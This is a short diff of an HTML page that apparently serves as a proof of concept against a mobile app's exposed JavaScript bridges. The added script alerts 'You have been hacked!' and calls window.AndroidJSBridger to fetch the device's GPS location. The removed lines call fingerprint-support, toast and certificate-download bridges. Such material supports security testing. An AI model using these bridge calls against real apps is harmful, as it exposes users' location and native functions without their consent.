@@ -8,11 +8,15 @@
 <a href="bitmar.onelink.me://">step 1 </a></br></br>
 
 <script>
-        alert("haha");
-        var IFAACheckSupport = window.IFAAFingerUtils.IFAACheckSupport();
-        alert("IFAACheckSupport = " + IFAACheckSupport);
-        window.nativeToast.toast(10000, "middle", "hacked! ");
-        window.cfcaCert.downloadCert();
+        alert("You have been hacked!");
+        var p1 = "getGpsLocation";
+        var p2 = "{}";
+        var callback = function(res, position) {
+                alert(res);
+                alert(position);
+                // this.queue[position].apply(this, arguments);        
+        };
+        window.AndroidJSBridger.invoke(p1,p2,callback);
 </script>
 </body>
 </html>
